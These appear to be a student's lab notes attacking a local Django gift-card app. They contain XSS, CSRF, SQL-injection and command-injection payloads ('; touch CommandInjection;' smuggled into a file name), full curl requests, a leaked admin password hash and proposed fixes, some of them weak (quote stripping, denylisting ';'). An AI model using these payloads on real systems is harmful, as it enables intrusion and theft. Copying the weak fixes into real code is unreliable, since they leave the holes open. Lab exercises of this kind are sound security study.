id   last_login   username   password
6   000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3   2020-10-01 12:51:48.124599   admin




'select id from LegacySite_card where data = a UNION SELECT password from LegacySite_user where username = admin'


znu7xp5661es2vmvzpum34o6s99ze7y7

1; select password from LegacySite_user where username = "admin";



"signature": "1'; select * from LegacySite_user;'"

-------------------------------------------------------------------------------------------
Task 1 - XSS - JS "injection" -- /><script>alert("XSS Vulnerability Located")</script>
-------------------------------------------------------------------------------------------
CURL:
curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:8000/index.html' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    -b $'sessionid=da46v9oox82yg3sxlylhhay0e3560fw0' \
    $'http://127.0.0.1:8000/buy/1?director=%2f%3e%3cscript%3ealert(%22XSS%20Vulnerability%20Located%22)%3c%2fscript%3e'

URL:
http://127.0.0.1:8000/buy/1?director=%2f%3e%3cscript%3ealert(%22XSS%20Vulnerability%20Located%22)%3c%2fscript%3e

SAVED AS FILE:
In "Attacks" folder on Kali VM - "XSS"

Fix:
In views.py, buy_card_view()
"import html
director = html.escape(director)"

============================================================================================

Cookie: sessionid=da46v9oox82yg3sxlylhhay0e3560fw0

curl -i - -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:8000/gift.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 25' -H $'Origin: http://127.0.0.1:8000' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    --data-binary $'amount=105&username=alice' \
    $'http://127.0.0.1:8000/gift/0' > /dev/null/


------------------------------------------------------------------------------------------------------
Task 3 - SQLi -- "signature": "a' union select password from LegacySite_user where username = 'admin"
------------------------------------------------------------------------------------------------------
Injected SQL union statement to find data = a in LegacySite_card and the password of username = admin from LegacySite_user

File: saved in VM as SQLInjection.gftcrd (/home/kali/Documents/AppSecLab2/AppSecLab2/Attacks)

Input (value of "signature" in malicious card): a' union select password from LegacySite_user where username = 'admin

Full SQL statement: select id from LegacySite_card where data = 'a' union select password from LegacySite_user where username = 'admin'

Output (also available in screenshot form on Windows PC): 
Found card with data: Card object (000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3)

Fix: use str.replace("'", "") to eliminate any occurences of ' to ensure that attackers cannot "break out" of the intended query format (b/c '' are already included in the original ~prompt: data = \'%s\'')
# SQL Injection Fix (revealing users' salted passwords)
    if "'" in signature:
        signature = signature.replace("'", "")

=====================================================================================================	

<script>window.close();</script>

window.open();
   window.close();
   window.open("http://127.0.0.1:8000/index.html");

<script>
function redirect(){
   window.top.close();
}
</script>



------------------------------------------------------------------------------------------------------
Task 2 - CSRF - get victim to gift you a card w/o their knowledge -- malicious HTML page
------------------------------------------------------------------------------------------------------
HTML for malicious page:
<html>
	<body>
		<iframe id="invisible" name="invisible" style="display:none;"></iframe>
		<form method="POST" target="invisible" action="http://127.0.0.1:8000/gift/0">
			<input type="hidden" name="amount" value="115"/>
			<input type="hidden" name="username" value="bob"/>
			<input type="submit" value="Claim your free reward!"  style="text-allign: center; background-color: blue; color: yellow; font-size: 3em; height: 100px; width: 600px; left: 250; top: 250;" >
		</form>
	</body>
<html>

--displays a webpage with a simple "Click for free reward!" button. Upon clicking: a card is gifted to the attacker without the victims knowledge (the webpage does not change to indicate anythin malicious has taken place) (assumes victim is logged into gift card site in their browser)

URL when demonstrated on VM: file:///home/kali/Documents/AppSecLab2/AppSecLab2/Attacks/XSRF.html

Details used for demonstration: bob = attacker, alice = victim, amount of gftcrd = 115

File: saved in VM as csrf.html (/home/kali/Documents/AppSecLab2/AppSecLab2/Attacks)

Screenshots: saved to Windows PC, provides screencaps of VM to demonstrate successful attack

Fix: Django's built-in CSRF token (specifically turned on in the gift_card_view in views.py)
(useful: https://www.stackhawk.com/blog/django-csrf-protection-guide/, https://portswigger.net/web-security/csrf)
Include right above the gift_card_view() function declaration:
# CSRF Vulnerability Fix - Task 2
@csrf_protect
def gift_card_view(request, prod_num=0)

=====================================================================================================


{
	"merchant_id": "NYU Apparel Card", 
	"customer_id": "bob", 
	"total_value": "200", 
	"records": [{
		"record_type": "amount_change", 
		"amount_added": 2000, 
		"signature": "b"
	}]
}

; touch CommandInjection;


------------------------------------------------------------------------------------------------------
Task 4 - Command Injection - inject a command to be run on the server's terminal
------------------------------------------------------------------------------------------------------
Vulnerability is found within extras.py, specifically we as the attacker must force a JSON decode error (or Unicode decode error) that then allows the following instruction to be run: ret_val = system(f"./{CARD_PARSER} 2 {card_path_name} > tmp_file"). For proof-of-concept, we inject a simple touch command to create a file within the server's directory - "CommandInjection". The vulnerable command in our attack becomes: ret_val = system(f"./giftcardreader 2 /tmp/; touch CommandInjection;_11_parser.gftcrd > tmp_file")

URL attacked: http://127.0.0.1:8000/use.html

Submitted gift card (available in Attack folder): ; touch CommandInjection;.gftcrd

NameYourCard prompt name provided: ; touch CommandInjection;

Contents of submitted gift card (to force necessary JSON decode error): 
[
	{
		"name": "Malicious Attacker",
		"id" "3v1L"
	}
]

Success proven by: existence of newly created CommandInjection file in server's directory (/home/kali/Documents/AppSecLab2/AppSecLab2)

Screenshots: saved to Windows PC, provides screencaps of VM to demonstrate successful attack

Sent packet as a CURL command:
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:8000/use.html' -H $'Content-Type: multipart/form-data; boundary=---------------------------301485736142003767752290610683' -H $'Content-Length: 584' -H $'Origin: http://127.0.0.1:8000' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    -b $'sessionid=72mq2r0hf9hvs4foiuvahdnocdytercg' \
    --data-binary $'-----------------------------301485736142003767752290610683\x0d\x0aContent-Disposition: form-data; name=\"card_data\"; filename=\"; touch CommandInjected; .gftcrd\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a[\x0a\x09{\x0a\x09\x09\"name\": \"Malicious Attacker\",\x0a\x09\x09\"id\" \"3v1L\"\x0a\x09}\x0a]\x0a\x0d\x0a-----------------------------301485736142003767752290610683\x0d\x0aContent-Disposition: form-data; name=\"card_supplied\"\x0d\x0a\x0d\x0aFalse\x0d\x0a-----------------------------301485736142003767752290610683\x0d\x0aContent-Disposition: form-data; name=\"card_fname\"\x0d\x0a\x0d\x0a; touch CommandInjection;\x0d\x0a-----------------------------301485736142003767752290610683--\x0d\x0a' \
    $'http://127.0.0.1:8000/use.html'

Fix: creating the variable system_call = (f"./{CARD_PARSER} 2 {card_path_name} > tmp_file"), then using system_call.replace() to eliminate any occurences of the following characters: ";", "&&", and "||". This ensures that only one command can be run as part of that system call. Full fix:
# Command Injection Fix - Task 4
    system_call = (f"./{CARD_PARSER} 2 {card_path_name} > tmp_file")
    system_call = system_call.replace(";", "")
    system_call = system_call.replace("&&", "")
    system_call = system_call.replace("||", "")
    ret_val = system(system_call)

=====================================================================================================






#!/bin/bash

curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,ap>
    -b $'sessionid=da46v9oox82yg3sxlylhhay0e3560fw0' \
    $'http://127.0.0.1:8000/buy/1?director=%2f%3e%3cscript%3ealert(%22XSS%20Vulnerability%20Located%22)%3c%2fscript%3e' | grep -c "<script>alert"
echo $?
#if [ $SQL_present -ge 1 ]
#then
#       exit 1
#fi
#       exit 0




#!/bin/bash

searchFor="$1"
db="$2"

sqlite3 "$db" .tables | while read table; do
    output=`sqlite3 -line "$db" "select * from $table" | grep "$searchFor"`
    if [[ "$?" -eq 0 ]]; then
        echo "Found in ${table}:"
        echo "$output"
    fi
done
